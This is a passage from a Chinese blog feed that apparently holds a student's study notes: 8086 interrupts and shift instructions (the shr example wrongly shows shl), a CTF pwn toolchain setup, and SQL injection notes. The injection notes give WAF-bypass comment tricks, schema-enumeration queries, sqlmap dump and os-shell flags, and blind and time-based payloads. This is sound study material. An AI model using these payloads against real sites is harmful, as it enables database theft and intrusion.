id="内中断产生"><a href="#内中断产生" class="headerlink" title="内中断产生"></a>内中断产生</h2><h3 id="中断判断码"><a href="#中断判断码" class="headerlink" title="中断判断码"></a>中断判断码</h3><p>字节型数据</p><p>标识中断信息的来源</p><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p>除法错误，div指令时产生的溢出                       中断码-0</p><p>单步执行                                                               中断码-1</p><p>执行into                                                                中断码-4</p><p>执行int（格式    int n    ）(n为字节型立即数)    中断码-n</p><h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>要根据中断信息确定处理程序的入口，从而设置CS和IP</p><h3 id="中断向量表"><a href="#中断向量表" class="headerlink" title="中断向量表"></a>中断向量表</h3><p>在内存中保存</p><p>中断向量（中断程序的入口地址）的列表</p><p>——</p><p>在知道中断类型码后，将其作为中断向量表的表项号，以此得到入口地址</p><p>——</p><p>对于寻找中断向量表，其存放在固定的内存地址</p><p>例如，对于8086</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">0000</span><span class="hljs-string">:0000</span><span class="hljs-string">到</span><span class="hljs-number">0000</span><span class="hljs-string">:03ff</span><span class="hljs-string">的1024个单元固定存放中断向量表</span><br><span class="hljs-string">一个表项占据2个字，高地址存放段地址，低地址存放偏移地址</span><br></code></pre></td></tr></table></figure><p>不过系统要处理的中断事件远不足256个，有许多单元是空的</p><p>一般从    0000:0200    到    0000：03ff    是空的</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="中断过程"><a href="#中断过程" class="headerlink" title="中断过程"></a>中断过程</h3><p>cpu使用中断码找到中    向量，并设置CS和IP</p><p>（在设置前先将原来的CS和IP保存，各个标志寄存器的值同样需要保存）</p><p>//在执行完后要恢复cpu状态</p><h3 id="处理-1"><a href="#处理-1" class="headerlink" title="处理"></a>处理</h3><p>cpu收到中断信息后，引发中断过程，随后执行中断程序</p><p>执行完中断程序后，返回原执行点继续</p><h2 id="中断处理程序与iret指令"><a href="#中断处理程序与iret指令" class="headerlink" title="中断处理程序与iret指令"></a>中断处理程序与iret指令</h2><h3 id="处理程序"><a href="#处理程序" class="headerlink" title="处理程序"></a>处理程序</h3><p>保存用到的寄存器</p><p>处理中断</p><p>恢复寄存器</p><p>使用iret返回</p><h3 id="iret"><a href="#iret" class="headerlink" title="iret"></a>iret</h3><p>功能的汇编描述：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ip</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">cs</span><br><span class="hljs-keyword">popf</span><br></code></pre></td></tr></table></figure><p>出栈顺序与中断过程中入栈顺序相对应</p><p>通常与自动的中断过程配合使用</p><h2 id="编写中断程序的安装"><a href="#编写中断程序的安装" class="headerlink" title="编写中断程序的安装"></a>编写中断程序的安装</h2><p>代码长度的计算</p><p>例如对do0</p><p>长度为offest do0end - offest do0</p><p>程序所有内容都应放置于不会被覆盖的空间，以免被其他内容覆盖</p><h2 id="单步中断"><a href="#单步中断" class="headerlink" title="单步中断"></a>单步中断</h2><p>（同样有多条指令组成）</p><p>（为单步跟踪程序的执行过程，提供了实现机制）</p><p>cpu在执行完一条指令后，如果检测到标志寄存器TF位为    1    ，会产生单步中断</p><p>debug的t命令便是通过将    TF    设置为1，使得cpu在处理完该条指令后引发单步中断，来在屏幕显示寄存器的内容并且等待命令</p><p>当    TF=1    ，cpu将陷入执行单步中断第一条指令的循环</p><p>我们在cpu执行程序前将    TF    设置为    0    ，以避免这种</p><h2 id="响应中断的特殊情况"><a href="#响应中断的特殊情况" class="headerlink" title="响应中断的特殊情况"></a>响应中断的特殊情况</h2><p>在cpu冒然的响应中断会导致错误的情况下，cpu不会响应中断</p><p>对于有这种关系的指令，我们务必将它们连续执行</p><h1 id="13-int"><a href="#13-int" class="headerlink" title="13.int"></a>13.int</h1><p>格式</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span><br>//<span class="hljs-built_in">n</span>为中断类型码<br></code></pre></td></tr></table></figure><p>相当于引发一个    n    号1中断的中断过程</p><h1 id="14-端口"><a href="#14-端口" class="headerlink" title="14.端口"></a>14.端口</h1><h2 id="逻辑位移指令"><a href="#逻辑位移指令" class="headerlink" title="逻辑位移指令"></a>逻辑位移指令</h2><h3 id="shl"><a href="#shl" class="headerlink" title="shl"></a>shl</h3><p>逻辑左移指令（左移一位相当于乘    2    ）</p><p>当移动位数大于    1    时，移动位数要放在 cl 中</p><p>——</p><p>1.将一个寄存器或内存单元中的数据向左位移</p><p>2.将最后移出的一位写入    CF    中</p><p>3.最低为用    0    补充</p><p>——</p><p>例如：对    01001000b</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">01001000b</span><br><span class="hljs-keyword">shl</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>//执行后</p><p>(al)=10010000b</p><p>CF=0</p><h3 id="shr"><a href="#shr" class="headerlink" title="shr"></a>shr</h3><p>逻辑右移指令（右移一位相当于除    2    ）</p><p>当移动位数大于    1    时，移动位数要放在 cl 中</p><p>——</p><p>1.将一个寄存器或内存单元中的数据向右位移</p><p>2.将最后移出的一位写入    CF    中</p><p>3.最高为用    0    补充</p><p>——</p><p>例如：对    10000001b</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">10000001b</span><br><span class="hljs-keyword">shl</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>//执行后</p><p>(al)=01000000b</p><p>CF=1</p><h1 id="15-外中断"><a href="#15-外中断" class="headerlink" title="15.外中断"></a>15.外中断</h1>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从0到1,搭建pwn机</title>
    <link href="/2023/09/08/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/09/08/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu的安装与换源"><a href="#ubuntu的安装与换源" class="headerlink" title="ubuntu的安装与换源"></a>ubuntu的安装与换源</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>国内的科大源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-releases/</span><br></code></pre></td></tr></table></figure><p>选择<strong>20</strong>版本进行下载</p><p>然后进行一个<strong>ubuntu20</strong>的装, 自行搜索. </p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>执行下列语句</p><h4 id="ubuntu20"><a href="#ubuntu20" class="headerlink" title="ubuntu20"></a>ubuntu20</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo sed -i <span class="hljs-string">&#x27;s@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g&#x27;</span> <span class="hljs-regexp">/etc/</span>apt/sources.list &amp;&amp; sudo apt update<br><span class="hljs-comment">#换国内源并更新</span><br></code></pre></td></tr></table></figure><h4 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h4><p>pip是一个以Python计算机程序语言写成的软件包管理系统，他可以安装和管理软件包</p><p>pip还没下载,先安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt install <span class="hljs-keyword">python3</span>-pip  <br>#安装pip <br><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> pip install --upgrade pip -i https://pypi.mirrors.ustc.edu.<span class="hljs-keyword">cn</span>/simple<br>#更新pip<br>sudo pip3 config <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span>.<span class="hljs-built_in">index</span>-url https://pypi.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/simple<br>pip3 config <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span>.<span class="hljs-built_in">index</span>-url https://pypi.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/simple<br>pip换源<br></code></pre></td></tr></table></figure><h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><h4 id="git"><a href="#git" class="headerlink" title="git"></a>git</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> git<br></code></pre></td></tr></table></figure><h4 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h4><h5 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h5><p>Pwntools是一个CTF框架和漏洞利用开发库。 它以Python编写，专为快速原型设计和开发而设计，旨在使漏洞利用编写尽可能简单。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.pwntools.com<span class="hljs-regexp">/en/</span>stable/about.html<br><span class="hljs-comment">#建议搭配google翻译</span><br></code></pre></td></tr></table></figure><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=<span class="hljs-variable">$HOME</span>/.local/bin:<span class="hljs-variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc &amp;&amp; <span class="hljs-built_in">source</span> ~/.bashrc<br><span class="hljs-comment">#默认路径的缺少我们包安装的位置, 进行一个加的添</span><br>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential <br><span class="hljs-comment">#安装依赖</span><br>python3 -m pip install --upgrade pip<br><span class="hljs-comment">#更新pip</span><br>python3 -m pip install --upgrade pwntools <br><span class="hljs-comment">#安装pwntools</span><br></code></pre></td></tr></table></figure><p>然后使用<strong>pwntools</strong>时我的环境会提示缺少包, 但是在安装列表有能看到包的存在</p><p>requirements.txt #创建requirements.txt文件</p><p>内容为</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">wheel</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.30</span>.<span class="hljs-number">0</span><br>docutils<br><span class="hljs-attribute">breathe</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">4.7</span>.<span class="hljs-number">3</span><br>sphinx&gt;<span class="hljs-number">1.8</span><br><span class="hljs-attribute">docutils</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.14</span><br>sphinx_rtd_theme<br>junit2html<br><span class="hljs-attribute">PyYAML</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.12</span><br><span class="hljs-attribute">ply</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.10</span><br>gitlint<br><span class="hljs-attribute">pyelftools</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.24</span><br>pyserial<br>pykwalify<br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">pip3 install --<span class="hljs-keyword">user</span> <span class="hljs-title">-r</span> requirements.txt<br></code></pre></td></tr></table></figure><h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h4><p>one_gadget是一个用于自动搜索gadget（指令序列）的工具</p><p>它可以找出<strong>libc</strong>中存在的一些执行**execve(“/bin/sh”, NULL, NULL)**的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo apt install ruby <br><span class="hljs-comment">#安装ruby</span><br>sudo apt install gem <br><span class="hljs-comment">#安装gem</span><br>gem sources  <br><span class="hljs-comment">#列出默认源</span><br>gem sources --remove https:<span class="hljs-regexp">//</span>rubygems.org/  <br><span class="hljs-comment">#移除默认源</span><br>gem sources -a https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/rubygems/</span> <br><span class="hljs-comment">#添加科大源</span><br>gem sources -u  <br><span class="hljs-comment">#更新源缓存</span><br>sudo gem install one_gadget <br><span class="hljs-comment">#安装one_gadget</span><br></code></pre></td></tr></table></figure><h4 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt-get <span class="hljs-keyword">install </span>ruby-full<br>sudo apt-get <span class="hljs-keyword">install </span><span class="hljs-keyword">build-essential</span><br><span class="hljs-keyword"></span>sudo gem <span class="hljs-keyword">install </span>seccomp-tools <br><span class="hljs-comment">#安装seccomp-tools</span><br></code></pre></td></tr></table></figure><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p>ROPgadget是一款可以在二进制文件中搜索Gadget的强大工具</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo -H python3 -m pip <span class="hljs-keyword">install</span> ROPgadget<br><span class="hljs-comment">#安装ROPgadget</span><br></code></pre></td></tr></table></figure><h4 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h4><p>patchelf是一个命令行工具，用于修改现有的可执行文件或共享库的属性。 主要用途是修改二进制文件中的运行时库依赖关系，或者将文件中的路径修改为其他路径</p><p>主要用来修改二进制文件的glibc</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> patchelf <br><span class="hljs-comment">#安装patchelf</span><br></code></pre></td></tr></table></figure><h4 id="pwngdb与peda与Pwndbg"><a href="#pwngdb与peda与Pwndbg" class="headerlink" title="pwngdb与peda与Pwndbg"></a>pwngdb与peda与Pwndbg</h4><p>gdb的插件,在ctf中pwn题目中使用非常方便</p><p>注意路径</p><p>我个人是安装到了**$HOME/Desktop/pwntools/gdb**目录下,记得改成你自己的</p><p>这个<strong>pwntools</strong>文件夹与我们利用<strong>pip</strong>安装的<strong>pwntools</strong>无关</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/Desktop/pwntools<br><span class="hljs-built_in">mkdir</span> gdb &amp;&amp; <span class="hljs-built_in">cd</span> gdb<br>git <span class="hljs-built_in">clone</span> https://github.com/longld/peda.git<br>git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git<br>git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/Desktop/pwntools/gdb<br><span class="hljs-built_in">cp</span> <span class="hljs-variable">$HOME</span>/Desktop/pwntools/gdb/Pwngdb/.gdbinit <span class="hljs-variable">$HOME</span>/.gdbinit<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#source <span class="hljs-variable">$HOME</span>/Desktop/pwntools/gdb/peda/peda.py&quot;</span> &gt; <span class="hljs-variable">$HOME</span>/.gdbinit <br><span class="hljs-comment">#写入配置</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source <span class="hljs-variable">$HOME</span>/Desktop/pwntools/gdb/pwndbg/gdbinit.py &quot;</span> &gt;&gt; <span class="hljs-variable">$HOME</span>/.gdbinit <br><span class="hljs-comment">#写入配置</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source <span class="hljs-variable">$HOME</span>/Desktop/pwntools/gdb/Pwngdb/pwngdb.py&quot;</span> &gt;&gt; <span class="hljs-variable">$HOME</span>/.gdbinit<br><span class="hljs-comment">#写入配置</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source <span class="hljs-variable">$HOME</span>/Desktop/pwntools/gdb/Pwngdb/angelheap/gdbinit.py&quot;</span> &gt;&gt; <span class="hljs-variable">$HOME</span>/.gdbinit<br><span class="hljs-comment">#写入配置</span><br></code></pre></td></tr></table></figure><h4 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h4><p>LibcSearcher是python的一个库，用于解决pwn中不明libc版本的情况，可以根据泄露的某函数地址，推测服务端使用的libc版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/Desktop/</span>pwntools <br><span class="hljs-comment">#进入pwntools文件夹</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lieanu/</span>LibcSearcher.git <br><span class="hljs-comment">#下载LibcSearcher</span><br>cd LibcSearcher <br><span class="hljs-comment">#进入LibcSearcher文件夹</span><br>sudo python3 setup.py develop <br><span class="hljs-comment">#安装LibcSearcher</span><br></code></pre></td></tr></table></figure><h4 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h4><p>是一个开源项目，里面有各种版本的glibc 源码</p><p>当我们需要有不同版本的 glibc 可执行文件时很方便</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/matrix1001/g</span>libc-all-<span class="hljs-keyword">in</span>-one.git <br><span class="hljs-comment">#下载glibc-all-in-one</span><br></code></pre></td></tr></table></figure><h1 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h1><p>安装完记得打个快照先</p><h1 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lekclc/</span>pwn_environment<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/09/05/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/09/05/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h2><p>（与数据库交互的地方）</p><p>​    参数可控；</p><p>常见点：</p><p>​    1. 表单中的输入参数</p><ol start="2"><li><p>URL中的参数</p></li><li><p>Cookie或header头中其它参数</p></li></ol><p>用户信息、排名公布、文章展示、评论、搜索框、登陆框、cookie（session持久化需要存储在数据库中）</p><h2 id="2-找到闭合符"><a href="#2-找到闭合符" class="headerlink" title="2.找到闭合符"></a>2.找到闭合符</h2><h2 id="3-注释"><a href="#3-注释" class="headerlink" title="3.注释"></a>3.注释</h2><p>1.单行注释：</p><p>#后直接加内容；</p><p>——后面必须要加空格</p><p>2.多行注释：</p><p> /**/中间可以跨行，不一定要跨</p><p>3.内联注释（是MySQL数据库为了保持与其他数据库兼容，特意新添加的功能）：</p><p>(在过滤时可以代替空格)</p><p> 为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 /*! … */中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。</p><p>/*!50001 */表示数据库版本&gt;=5.00.01时中间的语句才会执行，在SQL注入中，内联注释常用来绕过waf。</p><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/image.1w96op86cups.webp"></p><h1 id="数据库查询常用语句"><a href="#数据库查询常用语句" class="headerlink" title="数据库查询常用语句"></a>数据库查询常用语句</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">库：<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata;<br><br>表：<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span>；<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>；<br><br>字段：<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;库名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>;<br><br>数据：<br><span class="hljs-keyword">select</span> group_concat(字段名,<span class="hljs-number">0x3a</span>,字段名) <span class="hljs-keyword">from</span> 库名.表名；<br></code></pre></td></tr></table></figure><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-h帮助信息</span><br><span class="hljs-deletion">-u目标 URL</span><br><span class="hljs-deletion">-dbs枚举所有数据库名</span><br><span class="hljs-deletion">-current-db获取当前数据库名</span><br><span class="hljs-deletion">-D指定数据库</span><br><span class="hljs-deletion">-tables枚举所有表名</span><br><span class="hljs-deletion">-T指定数据表</span><br><span class="hljs-deletion">-columns枚举所有字段名</span><br><span class="hljs-deletion">-C指定数据列</span><br><span class="hljs-deletion">-dump获取数据内容</span><br><span class="hljs-deletion">-p指定参数</span><br><span class="hljs-deletion">--data使用 POST 发送数据串</span><br><span class="hljs-deletion">-r从文件中读取 HTTP 请求</span><br><span class="hljs-deletion">--level设置测试等级（1-5，默认为 1）</span><br><span class="hljs-deletion">--risk设置测试风险等级（1-3，默认为 1）</span><br><span class="hljs-deletion">--random-agent随机ua进行测试</span><br><span class="hljs-deletion">--cookie指定cookie</span><br><span class="hljs-deletion">--os-shell调出交互式shell</span><br><span class="hljs-deletion">--dbms指定数据库类型</span><br><span class="hljs-deletion">--os指定操作系统</span><br><span class="hljs-deletion">--threads设置请求并发数最大值（默认 1）</span><br></code></pre></td></tr></table></figure><p>链接：<a href="https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67">sqlmap参数详解 (yinxiang.com)</a></p><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u 路径  -<span class="hljs-selector-tag">p</span> 注入点,注入点<br></code></pre></td></tr></table></figure><h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u 路径 <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;post传入的内容&quot;</span> -<span class="hljs-selector-tag">p</span> 注入点,注入点<br>python sqlmap<span class="hljs-selector-class">.py</span> -u 路径 -r 数据包<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> 注入点,注入点<br></code></pre></td></tr></table></figure><h2 id="level"><a href="#level" class="headerlink" title="level"></a>level</h2><p>跑不出可以增加等级，最好将检测过的除去</p><p>–level=</p><p>（默认）1</p><p>2    cookie</p><p>（建议）3    user-agent</p><p>5    host</p><p>–risk=</p><p>1    大部分语句</p><p>2    增加基于事件的语句</p><p>（建议）3    增加基于or的语句</p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息</p><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p><p>——————</p><p>例如：</p><p>输入 id = 1’ and 1 – + 页面内容显示正常</p><p>输入 id = 1’ and 0– + 页面内容显示不正常</p><h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><p>盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p><p>——————</p><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 